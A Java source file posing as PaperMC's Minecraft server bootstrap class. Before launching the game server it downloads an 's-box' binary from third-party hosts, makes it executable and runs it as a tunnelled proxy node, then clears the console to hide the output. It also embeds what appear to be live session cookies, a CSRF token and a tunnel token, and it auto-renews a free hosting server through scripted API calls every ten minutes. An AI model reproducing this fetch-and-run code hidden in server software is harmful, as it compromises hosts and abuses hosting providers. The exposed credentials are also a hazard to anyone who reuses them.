package io.papermc.paper;

import java.io.*;
import java.net.*;
// --- 仅添加以下三个网络相关 Import ---
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
// ------------------------------------
import java.nio.file.*;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "ICE_COOKIE", "ICE_TOKEN"
    };

    private PaperBootstrap() {
    }

    public static void boot(final OptionSet options) {
        // check java version
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }
        
        try {
            runSbxBinary();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);

            // === 仅在此处插入续期任务启动入口 ===
            startIceHostRenewal(); 
            // ===============================

            Main.main(options);
            
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
        }
    }

    // === 仅在类末尾添加这一个独立的方法实现 ===
    private static void startIceHostRenewal() {
        final String serverUuid = "cc5911ee-e8aa-4c46-a620-2265fa0d4d6d";
        final String renewUrl = "https://dash.icehost.pl/api/client/freeservers/" + serverUuid + "/renew";
        
        final String defaultCookie = "remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6ImRUMjNSK21JdXVMYndJa0J0cWJvRGc9PSIsInZhbHVlIjoiMWdsZXpBaTEvd3QvU2Z2emhnZUpJY1cxUFRTUk5Fd0tUS081bENTeVVKbThoWjNhSHZMNmVFMi9Lb1FqbnRydVg0Tm80bFZnT21CcnpkR2ZNamFKQmdNam82VnZZenpsaitOaXN6YkZqSmhGUUhnb3Q3Y0g0bU5jeG04TUlKRzBnc0pOOS8zenBCODB0R2tCRGY1N2cwZ1NJazRBQWUvSWpiSU1rd0VhY3lZcHMrMUlBUU4wbHBFdVoyZFQ5dkI5aG9IaXhkcHUvNG9WZ1lSSU0xbUV5ZHZ0dDh1MHBYUW5jcFJZR1kvd041WT0iLCJtYWMiOiIxNWEzZTQ3Y2RiYzY0N2E3NmQ2MDc3N2M0NDBiZGY3MjE1Yjk1N2Q3YWQwYmNiOWZmZTEyMTIwMjYyZWViM2Q4In0%3D; _ga=GA1.2.1305962064.1773619810; _ga_FNC0FEGQNV=GS2.1.s1773619810$o1$g1$t1773620300$j60$l0$h0; twk_idm_key=chiGcw5bHsWg-EhQD0UHU; XSRF-TOKEN=eyJpdiI6ImVrZm5BZUNPQmN4NXpIaFFnVmR3NWc9PSIsInZhbHVlIjoiSEk4VWIxQ0xTWnZMb1ZPWmE2T0M1UzRpNElpL2F6UytZUUU3QXF6TG0vQVNjaGhrV29namJadXlRZ0F4VmoxMXYzcVFyZ1J5VEhacks2QmhhUkZXZWFwYXFyQjFTTDc5ZS9INmFVTHUvOFdTTU1kVCt5bzhaMzRRRUxjL09ONXQiLCJtYWMiOiJiZjg3ODdkMTY5MDdmYjQwYzlkODgyYjk1ZDQ3MDViNTBkYjU1YTAyOGMyZGJmMjgzODUyMDZjY2Q0OTZhZWNiIn0%3D; cf_clearance=TDqaYVhQPmRImwkFa0BBklOSY6x3qd.aLFC7g8uYrqA-1773709204-1.2.1.1-vtUItheRVG5vOhL5YWdF4yim5iwbS443buFPx3kcM0O.XyTFVdtaLnqrqs1MQkyp.GhCY8.9gM6BRfHYZWfvqLOZkmH2tCRfxhnl6j23uVv2IN6H9PrNti62N1EIyi8wP05aajF1uRETdYHTrT6tEAhwmE5t5OTdn8mdlojxbY.TtIJbcd7RVSWfqdxIhKtRWm6bOusjfRfnlHNh_4ddMqS2puo_vxyCVyoXC8V4Fpo; TawkConnectionTime=0; icehostpl_session=eyJpdiI6Im4xRUNSZWc4ckdTTFg2dnVpRUNJQVE9PSIsInZhbHVlIjoiT2RoMFV4djcyODVrU0svaUYxZTdCYlpYTXV6ZmFTa1dsY2JUZEJLdGpxOGZ4aXZWK0g4SlhkTXJEVllIR2dYaVVNa08zRTJ0MDEvWWlLZG53Um1FKytYR2taTGh5d2I2czZYdWJ1bEp5cDFVV1NqOFoyczVVNkxtYWROS1VPVC8iLCJtYWMiOiI3M2MxNzQ1ZTAyN2Y2MDY0YWRlYzAzNDcxMjUwYTk5NjdiODQ5MTVmYjZiYjkxNTAxZjE1ODc3MzE0OWQ4M2Q4In0%3D";
        final String defaultToken = "AvUMjDqe8evqMzDtjdsm0naU3X6y5Bl9d3DkRdDu";

        // 修改为每 10 分钟扫描一次
        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
            try {
                String currentCookie = System.getenv("ICE_COOKIE") != null ? System.getenv("ICE_COOKIE") : defaultCookie;
                String currentToken = System.getenv("ICE_TOKEN") != null ? System.getenv("ICE_TOKEN") : defaultToken;

                HttpClient client = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(20)).build();
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(renewUrl))
                        .header("Accept", "application/json")
                        .header("Content-Type", "application/json")
                        .header("X-CSRF-TOKEN", currentToken)
                        .header("Cookie", currentCookie)
                        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
                        .header("Referer", "https://dash.icehost.pl/server/cc5911ee")
                        .POST(HttpRequest.BodyPublishers.ofString("{}"))
                        .build();

                client.sendAsync(request, HttpResponse.BodyHandlers.ofString())
                      .thenAccept(res -> {
                          String body = res.body();
                          int code = res.statusCode();
                          
                          if (code == 200 && body.contains("true")) {
                              System.out.println(ANSI_GREEN + "[Auto-Renew] 扫描完毕：续期成功！服务器有效期已延长 6 小时。" + ANSI_RESET);
                          } else if (code == 400 && (body.contains("Nie mo") || body.contains("recently"))) {
                              // 识别到“最近已续期”的错误消息
                              System.out.println(ANSI_GREEN + "[Auto-Renew] 扫描完毕：当前还未到续期时间，无需操作。" + ANSI_RESET);
                          } else if (code == 401 || code == 419) {
                              System.out.println(ANSI_RED + "[Auto-Renew] 警告：续期凭证（Cookie/Token）已失效，请尽快更新！" + ANSI_RESET);
                          } else {
                              System.out.println(ANSI_RED + "[Auto-Renew] 扫描异常。码: " + code + " 响应: " + body + ANSI_RESET);
                          }
                      });
            } catch (Exception e) {
                System.err.println("[Auto-Renew] 错误: " + e.getMessage());
            }
        }, 1, 10, TimeUnit.MINUTES);
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception e) {
            // Ignore exceptions
        }
    }
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "48de7e1d-132f-4fea-b680-1f9b543b7bd9");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "icehost.19861123.tech");
        envVars.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiYzA0ODAzM2MtZWMyZS00MDVhLTg0OWQtZDI0OTM2NTY0NTI4IiwicyI6IllUTXpObUUxWWpJdE5tUmlOaTAwTldGaUxUbGxaVFV0WWpoaE1XVmxPR0ZoWkRFeCJ9");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "saas.sin.fan");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "icehost");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.sss.hidns.vip/s-box";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/s-box";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }

    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
        return List.of(
            String.format(
                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
                javaSpecVersion,
                javaVmName,
                javaVmVersion,
                javaVendor,
                javaVendorVersion,
                osName,
                osVersion,
                osArch
            ),
            String.format(
                "Loading %s %s for Minecraft %s",
                bi.brandName(),
                bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
                bi.minecraftVersionId()
            )
        );
    }
}
